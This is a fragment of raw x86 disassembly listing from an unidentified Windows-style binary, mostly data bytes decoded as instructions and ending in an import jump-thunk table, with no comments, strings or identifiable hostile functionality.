  4171f1:	adc    eax,0x3edfbd
  4171f6:	add    BYTE PTR [eax],al
  4171f8:	xor    bl,bh
  4171fa:	div    DWORD PTR [ebx]
  4171fc:	cmp    esi,DWORD PTR [ebx-0xc]
  4171ff:	push   ebp
  417200:	lock adc eax,DWORD PTR [ecx]
  417203:	inc    ebp
  417204:	cdq    
  417205:	fwait
  417206:	or     bl,ch
  417208:	(bad)  
  417209:	fwait
  41720a:	sub    esp,esp
  41720c:	(bad)  
  41720e:	dec    DWORD PTR [eax+0x4153343c]
  417214:	xor    DWORD PTR [ecx],eax
  417216:	(bad)  
  417217:	mov    DWORD PTR [esp+ebp*2],esp
  41721a:	push   ebx
  41721b:	inc    ecx
  41721c:	xor    DWORD PTR [ecx],eax
  41721e:	(bad)  
  41721f:	mov    DWORD PTR [eax+edi*1],edi
  417222:	push   ebx
  417223:	inc    ecx
  417224:	xor    DWORD PTR [esi+ecx*2],edi
  417227:	test   DWORD PTR [esi+0x45],0xded60d8b
  41722e:	add    BYTE PTR ds:[eax+0x31b9f7d7],ch
  417235:	adc    al,BYTE PTR [eax+0x0]
  417238:	mov    al,0x3a
  41723a:	add    BYTE PTR [edx],al
  41723c:	xor    DWORD PTR [ecx+ecx*4],edx
  41723f:	push   ebp
  417240:	sbb    ecx,edi
  417242:	into   
  417243:	mov    DWORD PTR [esp+edi*1],edi
  417246:	push   ebx
  417247:	inc    ecx
  417248:	xor    DWORD PTR [ebx-0x18],esi
  41724b:	push   ebp
  41724c:	jo     0x417262
  41724e:	push   eax
  41724f:	call   0x3ebc89
  417254:	mov    dl,0x4f
  417256:	add    al,0x8b
  417258:	cmp    al,0x40
  41725a:	push   ebx
  41725b:	inc    ecx
  41725c:	add    BYTE PTR [eax],al
  41725e:	xor    ebx,esp
  417260:	out    0xd5,eax
  417262:	fild   DWORD PTR [ebp+edi*8-0x7b]
  417266:	icebp  
  417267:	mov    esi,0x38f13303
  41726c:	sub    cl,BYTE PTR [ebx+0x4153300c]
  417272:	xor    DWORD PTR [ecx+0x6b204c4],edx
  417278:	clc    
  417279:	push   ebp
  41727a:	lock adc eax,DWORD PTR [eax]
  41727d:	je     0x4172b7
  41727f:	jae    0x417255
  417281:	push   ebp
  417282:	lock adc eax,DWORD PTR [edi-0x17efb2bc]
  417289:	pop    ebp
  41728a:	mov    WORD PTR [ebp+edi*8-0x75],es
  41728e:	sbb    al,0x20
  417290:	push   esi
  417291:	inc    ecx
  417292:	xor    edx,esp
  417294:	shl    BYTE PTR [ebx],0x71
  417297:	cwde   
  417298:	jecxz  0x4172f7
  41729a:	jb     0x4172f3
  41729c:	int3   
  41729d:	int3   
  41729e:	xor    DWORD PTR [eax+eax*1],edx
  4172a1:	add    BYTE PTR [ecx],dh
  4172a3:	adc    al,0x0
  4172a5:	add    BYTE PTR [ecx],dh
  4172a7:	adc    al,0x0
  4172a9:	add    BYTE PTR [ecx],dh
  4172ab:	adc    al,0x0
  4172ad:	add    BYTE PTR [ecx],dh
  4172af:	adc    al,0x0
  4172b1:	add    BYTE PTR [ecx],dh
  4172b3:	adc    al,0x0
  4172b5:	add    BYTE PTR [ecx],dh
  4172b7:	adc    al,0x0
  4172b9:	add    BYTE PTR [ecx],dh
  4172bb:	adc    al,0x0
  4172bd:	add    BYTE PTR [ecx],dh
  4172bf:	adc    al,0x0
  4172c1:	add    BYTE PTR [eax],al
  4172c3:	add    BYTE PTR [ecx],dh
  4172c5:	adc    al,0x0
  4172c7:	add    BYTE PTR [ecx],dh
  4172c9:	adc    al,0x0
  4172cb:	add    BYTE PTR [ecx],dh
  4172cd:	adc    al,0x0
  4172cf:	add    BYTE PTR [ecx],dh
  4172d1:	adc    al,0x0
  4172d3:	add    BYTE PTR [ecx],dh
  4172d5:	adc    al,0x0
  4172d7:	add    BYTE PTR [ecx],dh
  4172d9:	adc    al,0x0
  4172db:	add    BYTE PTR [ecx],dh
  4172dd:	adc    al,0x0
  4172df:	add    BYTE PTR [ecx],dh
  4172e1:	adc    al,0x0
  4172e3:	add    BYTE PTR [ecx],dh
  4172e5:	adc    al,0x0
  4172e7:	add    BYTE PTR [ecx],dh
  4172e9:	adc    al,0x0
  4172eb:	add    BYTE PTR [ecx],dh
  4172ed:	adc    al,0x0
  4172ef:	add    BYTE PTR [ecx],dh
  4172f1:	adc    al,0x0
  4172f3:	add    BYTE PTR [ecx],dh
  4172f5:	adc    al,0x0
  4172f7:	add    BYTE PTR [ecx],dh
  4172f9:	adc    al,0x0
  4172fb:	add    BYTE PTR [ecx],dh
  4172fd:	adc    al,0x0
  4172ff:	add    BYTE PTR [ecx],dh
  417301:	adc    al,0x0
  417303:	add    BYTE PTR [ecx],dh
  417305:	adc    al,0x0
  417307:	add    BYTE PTR [ecx],dh
  417309:	adc    al,0x0
  41730b:	add    BYTE PTR [ecx],dh
  41730d:	adc    al,0x0
  41730f:	add    BYTE PTR [ecx],dh
  417311:	adc    al,0x0
  417313:	add    BYTE PTR [ecx],dh
  417315:	adc    al,0x0
  417317:	add    BYTE PTR [ecx],dh
  417319:	adc    al,0x0
  41731b:	add    BYTE PTR [ecx],dh
  41731d:	adc    al,0x0
  41731f:	add    BYTE PTR [ecx],dh
  417321:	adc    al,0x0
  417323:	add    BYTE PTR [ecx],dh
  417325:	adc    al,0x0
  417327:	add    BYTE PTR [eax],al
  417329:	add    BYTE PTR [ecx],dh
  41732b:	adc    al,0x0
  41732d:	add    BYTE PTR [ecx],dh
  41732f:	adc    al,0x0
  417331:	add    BYTE PTR [ecx],dh
  417333:	adc    al,0x0
  417335:	add    BYTE PTR [ecx],dh
  417337:	adc    al,0x0
  417339:	add    BYTE PTR [ecx],dh
  41733b:	adc    al,0x0
  41733d:	add    BYTE PTR [ecx],dh
  41733f:	adc    al,0x0
  417341:	add    BYTE PTR [ecx],dh
  417343:	adc    al,0x0
  417345:	add    BYTE PTR [ecx],dh
  417347:	adc    al,0x0
  417349:	add    BYTE PTR [ecx],dh
  41734b:	adc    al,0x0
  41734d:	add    BYTE PTR [ecx],dh
  41734f:	adc    al,0x0
  417351:	add    BYTE PTR [ecx],dh
  417353:	adc    al,0x0
  417355:	add    BYTE PTR [ecx],dh
  417357:	adc    al,0x0
  417359:	add    BYTE PTR [ecx],dh
  41735b:	adc    al,0x0
  41735d:	add    BYTE PTR [ecx],dh
  41735f:	adc    al,0x0
  417361:	add    BYTE PTR [ecx],dh
  417363:	adc    al,0x0
  417365:	add    BYTE PTR [ecx],dh
  417367:	adc    al,0x0
  417369:	add    BYTE PTR [ecx],dh
  41736b:	adc    al,0x0
  41736d:	add    BYTE PTR [ecx],dh
  41736f:	adc    al,0x0
  417371:	add    BYTE PTR [ecx],dh
  417373:	adc    al,0x0
  417375:	add    BYTE PTR [ecx],dh
  417377:	adc    al,0x0
  417379:	add    BYTE PTR [ecx],dh
  41737b:	adc    al,0x0
  41737d:	add    BYTE PTR [ecx],dh
  41737f:	adc    al,0x0
  417381:	add    BYTE PTR [ecx],dh
  417383:	adc    al,0x0
  417385:	add    BYTE PTR [ecx],dh
  417387:	adc    al,0x0
  417389:	add    BYTE PTR [ecx],dh
  41738b:	adc    al,0x0
  41738d:	add    BYTE PTR [eax],al
  41738f:	add    BYTE PTR [ecx],dh
  417391:	adc    al,0x0
  417393:	add    BYTE PTR [ecx],dh
  417395:	adc    al,0x0
  417397:	add    BYTE PTR [ecx],dh
  417399:	adc    al,0x0
  41739b:	add    BYTE PTR [ecx],dh
  41739d:	adc    al,0x0
  41739f:	add    BYTE PTR [ecx],dh
  4173a1:	adc    al,0x0
  4173a3:	add    BYTE PTR [ecx],dh
  4173a5:	adc    al,0x0
  4173a7:	add    BYTE PTR [ecx],dh
  4173a9:	adc    al,0x0
  4173ab:	add    BYTE PTR [ecx],dh
  4173ad:	adc    al,0x0
  4173af:	add    BYTE PTR [ecx],dh
  4173b1:	adc    al,0x0
  4173b3:	add    BYTE PTR [ecx],dh
  4173b5:	adc    al,0x0
  4173b7:	add    BYTE PTR [ecx],dh
  4173b9:	adc    al,0x0
  4173bb:	add    BYTE PTR [ecx],dh
  4173bd:	adc    al,0x0
  4173bf:	add    BYTE PTR [ecx],dh
  4173c1:	adc    al,0x0
  4173c3:	add    BYTE PTR [ecx],dh
  4173c5:	adc    al,0x0
  4173c7:	add    BYTE PTR [ecx],dh
  4173c9:	adc    al,0x0
  4173cb:	add    BYTE PTR [ecx],dh
  4173cd:	adc    al,0x0
  4173cf:	add    BYTE PTR [ecx],dh
  4173d1:	adc    al,0x0
  4173d3:	add    BYTE PTR [ecx],dh
  4173d5:	adc    al,0x0
  4173d7:	add    BYTE PTR [ecx],dh
  4173d9:	adc    al,0x0
  4173db:	add    BYTE PTR [ecx],dh
  4173dd:	adc    al,0x0
  4173df:	add    BYTE PTR [ecx],dh
  4173e1:	adc    al,0x0
  4173e3:	add    BYTE PTR [ecx],dh
  4173e5:	adc    al,0x0
  4173e7:	add    BYTE PTR [ecx],dh
  4173e9:	adc    al,0x0
  4173eb:	add    BYTE PTR [ecx],dh
  4173ed:	adc    al,0x0
  4173ef:	add    BYTE PTR [eax],al
  4173f1:	add    al,BYTE PTR [eax]
  4173f3:	add    BYTE PTR [ecx],dh
  4173f5:	adc    al,0x0
  4173f7:	add    BYTE PTR [ecx],ch
  4173f9:	adc    al,0x0
  4173fb:	add    BYTE PTR [ebp-0x62cd6fda],ch
  417401:	es cwde 
  417403:	xor    cl,ch
  417405:	mov    al,es:0xa826cd32
  41740b:	xor    dh,BYTE PTR [ecx]
  41740d:	push   esp
  41740e:	add    DWORD PTR [eax],eax
  417410:	add    DWORD PTR [eax+eax*1],edx
  417413:	add    BYTE PTR [edx-0x1ec4b4d2],dl
  417419:	cs pop edx
  41741b:	cmp    ebx,esi
  41741d:	cs push 0x932f073b
  417423:	cmp    ecx,edi
  417425:	das    
  417426:	test   al,0x3b
  417428:	ins    DWORD PTR es:[edi],dx
  417429:	das    
  41742a:	in     eax,dx
  41742b:	cmp    ebp,DWORD PTR [edx]
  41742d:	sub    BYTE PTR [ecx],dl
  41742f:	cmp    al,0x38
  417431:	sub    BYTE PTR [ebp-0x78d66ac4],bl
  417437:	ds mov ah,0x2a
  41743a:	xchg   ebp,eax
  41743b:	ds jne 0x417468
  41743e:	int    0x3e
  417440:	dec    esi
  417441:	sub    bh,BYTE PTR [esi+0x3f]
  417444:	mov    dl,0x2a
  417446:	fwait
  417447:	aas    
  417448:	fsubr  DWORD PTR [edx]
  41744a:	scas   eax,DWORD PTR es:[edi]
  41744b:	aas    
  41744c:	fisubr WORD PTR [edx]
  41744e:	int3   
  41744f:	aas    
  417450:	add    ebp,DWORD PTR [ebx]
  417452:	out    0x3f,al
  417454:	add    BYTE PTR [ebx],ch
  417456:	stc    
  417457:	aas    
  417458:	add    BYTE PTR [eax],al
  41745a:	push   es
  41745b:	sub    eax,DWORD PTR [eax]
  41745d:	add    BYTE PTR [ecx],dh
  41745f:	inc    esp
  417460:	add    DWORD PTR [eax],eax
  417462:	mov    ebp,0x34000013
  417467:	and    al,0x18
  417469:	xor    BYTE PTR [eax+0x77308723],dh
  41746f:	and    eax,0x2574314b
  417474:	xor    WORD PTR [ecx+0x25],ax
  417478:	lea    esi,[ecx]
  41747a:	lea    esp,[edx+ebp*4]
  41747d:	xor    ebx,esi
  41747f:	and    al,0xe5
  417481:	xor    DWORD PTR [eax],esp
  417483:	sbb    DWORD PTR es:[edx],esi
  417486:	dec    esi
  417487:	es xor ah,BYTE PTR es:[ebp+0x26]
  41748c:	inc    ebp
  41748d:	xor    ch,dl
  41748f:	and    eax,0x25fb3253
  417494:	popa   
  417495:	xor    bl,BYTE PTR [esi]
  417497:	es jg  0x4174cc
  41749a:	lods   al,BYTE PTR ds:[esi]
  41749b:	and    eax,0x25d03297
  4174a0:	stos   DWORD PTR es:[edi],eax
  4174a1:	xor    bh,BYTE PTR [eax-0x7fcd3cdb]
  4174a7:	and    eax,0x27373308
  4174ac:	adc    al,0x33
  4174ae:	adc    al,0x27
  4174b0:	sub    dh,BYTE PTR [ebx]
  4174b2:	repz es jle 0x4174e9
  4174b6:	mov    ecx,0x90339526
  4174bb:	es stos DWORD PTR es:[edi],eax
  4174bd:	xor    eax,DWORD PTR [eax]
  4174bf:	add    BYTE PTR [ebp+0x6833be26],al
  4174c5:	es into 
  4174c7:	xor    eax,DWORD PTR ds:0x1633dd26
  4174cd:	es hlt 
  4174cf:	xor    ebx,DWORD PTR [ebx]
  4174d1:	push   DWORD PTR es:[ebx]
  4174d4:	sub    al,0x20
  4174d6:	or     DWORD PTR [edi+edi*1],esi
  4174d9:	and    BYTE PTR [esp+esi*1],dl
  4174dc:	push   ebx
  4174dd:	and    BYTE PTR [eax],ch
  4174df:	xor    al,0x4c
  4174e1:	and    BYTE PTR [edx],dh
  4174e3:	xor    al,0x66
  4174e5:	and    BYTE PTR [edx+0x34],bl
  4174e8:	mov    bh,0x20
  4174ea:	mov    WORD PTR [ebx+eax*8],?
  4174ed:	and    BYTE PTR [esp+esi*1+0x34eb20f7],bl
  4174f4:	fldenv [eax]
  4174f6:	or     al,0x35
  4174f8:	daa    
  4174f9:	pop    ds
  4174fa:	and    esi,DWORD PTR ds:0x35311f18
  417500:	clc    
  417501:	push   ds
  417502:	inc    esp
  417503:	xor    eax,0x355d1f65
  417508:	adc    ebx,DWORD PTR [edi]
  41750a:	jno    0x417541
  41750c:	lods   al,BYTE PTR ds:[esi]
  41750d:	pop    ds
  41750e:	mov    ?,WORD PTR ds:0x35a51fc7
  417514:	xor    DWORD PTR [eax+eax*1],edx
  417517:	add    BYTE PTR [ecx],dh
  417519:	adc    al,0x0
  41751b:	add    BYTE PTR [ecx],dh
  41751d:	adc    al,0x0
  41751f:	add    BYTE PTR [ecx],dh
  417521:	adc    al,0x0
  417523:	add    BYTE PTR [eax],al
  417525:	add    BYTE PTR [ecx],dh
  417527:	adc    al,0x0
  417529:	add    BYTE PTR [ecx],dh
  41752b:	adc    al,0x0
  41752d:	add    BYTE PTR [ecx],dh
  41752f:	adc    al,0x0
  417531:	add    BYTE PTR [ecx],dh
  417533:	adc    al,0x0
  417535:	add    BYTE PTR [ecx],dh
  417537:	adc    al,0x0
  417539:	add    BYTE PTR [ecx],dh
  41753b:	adc    al,0x0
  41753d:	add    BYTE PTR [ecx],dh
  41753f:	adc    al,0x0
  417541:	add    BYTE PTR [ecx],dh
  417543:	adc    al,0x0
  417545:	add    BYTE PTR [ecx],dh
  417547:	adc    al,0x0
  417549:	add    BYTE PTR [ecx],dh
  41754b:	adc    al,0x0
  41754d:	add    BYTE PTR [ecx],dh
  41754f:	adc    al,0x0
  417551:	add    BYTE PTR [ecx],dh
  417553:	adc    al,0x0
  417555:	add    BYTE PTR [ecx],dh
  417557:	adc    al,0x0
  417559:	add    BYTE PTR [ecx],dh
  41755b:	adc    al,0x0
  41755d:	add    BYTE PTR [ecx],dh
  41755f:	adc    al,0x0
  417561:	add    BYTE PTR [ecx],dh
  417563:	adc    al,0x0
  417565:	add    BYTE PTR [ecx],dh
  417567:	adc    al,0x0
  417569:	add    BYTE PTR [ecx],dh
  41756b:	adc    al,0x0
  41756d:	add    BYTE PTR [ecx],dh
  41756f:	adc    al,0x0
  417571:	add    BYTE PTR [ecx],dh
  417573:	adc    al,0x0
  417575:	add    BYTE PTR [ecx],dh
  417577:	adc    al,0x0
  417579:	add    BYTE PTR [ecx],dh
  41757b:	adc    al,0x0
  41757d:	add    BYTE PTR [ecx],dh
  41757f:	adc    al,0x0
  417581:	add    BYTE PTR [ecx],dh
  417583:	adc    al,0x0
  417585:	add    BYTE PTR [ecx],dh
  417587:	adc    al,0x0
  417589:	add    BYTE PTR [eax],al
  41758b:	add    BYTE PTR [ecx],dh
  41758d:	adc    al,0x0
  41758f:	add    BYTE PTR [ecx],dh
  417591:	adc    al,0x0
  417593:	add    BYTE PTR [ecx],dh
  417595:	adc    al,0x0
  417597:	add    BYTE PTR [ecx],dh
  417599:	adc    al,0x0
  41759b:	add    BYTE PTR [ecx],dh
  41759d:	adc    al,0x0
  41759f:	add    BYTE PTR [ecx],dh
  4175a1:	adc    al,0x0
  4175a3:	add    BYTE PTR [ecx],dh
  4175a5:	adc    al,0x0
  4175a7:	add    BYTE PTR [ecx],dh
  4175a9:	adc    al,0x0
  4175ab:	add    BYTE PTR [ecx],dh
  4175ad:	adc    al,0x0
  4175af:	add    BYTE PTR [ecx],dh
  4175b1:	adc    al,0x0
  4175b3:	add    BYTE PTR [ecx],dh
  4175b5:	adc    al,0x0
  4175b7:	add    BYTE PTR [ecx],dh
  4175b9:	adc    al,0x0
  4175bb:	add    BYTE PTR [ecx],dh
  4175bd:	adc    al,0x0
  4175bf:	add    BYTE PTR [ecx],dh
  4175c1:	adc    al,0x0
  4175c3:	add    BYTE PTR [ecx],dh
  4175c5:	adc    al,0x0
  4175c7:	add    BYTE PTR [ecx],dh
  4175c9:	adc    al,0x0
  4175cb:	add    BYTE PTR [ecx],dh
  4175cd:	adc    al,0x0
  4175cf:	add    BYTE PTR [ecx],dh
  4175d1:	adc    al,0x0
  4175d3:	add    BYTE PTR [ecx],dh
  4175d5:	adc    al,0x0
  4175d7:	add    BYTE PTR [ecx],dh
  4175d9:	adc    al,0x0
  4175db:	add    BYTE PTR [ecx],dh
  4175dd:	adc    al,0x0
  4175df:	add    BYTE PTR [ecx],dh
  4175e1:	adc    al,0x0
  4175e3:	add    BYTE PTR [ecx],dh
  4175e5:	adc    al,0x0
  4175e7:	add    BYTE PTR [ecx],dh
  4175e9:	adc    al,0x0
  4175eb:	add    BYTE PTR [ecx],dh
  4175ed:	adc    al,0x0
  4175ef:	add    BYTE PTR [eax],al
  4175f1:	add    BYTE PTR [ecx],dh
  4175f3:	adc    al,0x0
  4175f5:	add    BYTE PTR [ecx],dh
  4175f7:	adc    al,0x0
  4175f9:	add    BYTE PTR [ecx],dh
  4175fb:	adc    al,0x0
  4175fd:	add    bh,bh
  4175ff:	and    eax,0x418214
  417604:	jmp    DWORD PTR ds:0x418218
  41760a:	jmp    DWORD PTR ds:0x41821c
  417610:	jmp    DWORD PTR ds:0x418220
  417616:	jmp    DWORD PTR ds:0x418224
  41761c:	jmp    DWORD PTR ds:0x418228
  417622:	jmp    DWORD PTR ds:0x418230
  417628:	jmp    DWORD PTR ds:0x418238
  41762e:	jmp    DWORD PTR ds:0x418240
